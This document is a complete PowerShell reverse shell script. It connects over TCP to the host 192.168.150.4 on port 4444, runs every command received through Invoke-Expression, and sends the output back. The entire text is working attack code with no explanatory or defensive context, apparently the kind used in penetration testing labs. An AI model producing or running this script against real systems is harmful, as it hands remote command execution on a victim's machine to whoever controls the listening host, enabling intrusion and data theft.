$ip = "192.168.150.4"
$port = 4444
$client = New-Object System.Net.Sockets.TCPClient($ip,$port)
$stream = $client.GetStream()
$networkBuffer = New-Object Byte[] 65536
while(($data = $stream.Read($networkBuffer, 0, $networkBuffer.Length)) -gt 0) {
    $output = [System.Text.Encoding]::ASCII.GetString($networkBuffer,0, $data)
    $cmdOutput = Invoke-Expression $output 2>&1 | Out-String
    $response = ([text.encoding]::ASCII).GetBytes($cmdOutput)
    $stream.Write($response,0,$response.Length)
    $stream.Flush()
}
$client.Close()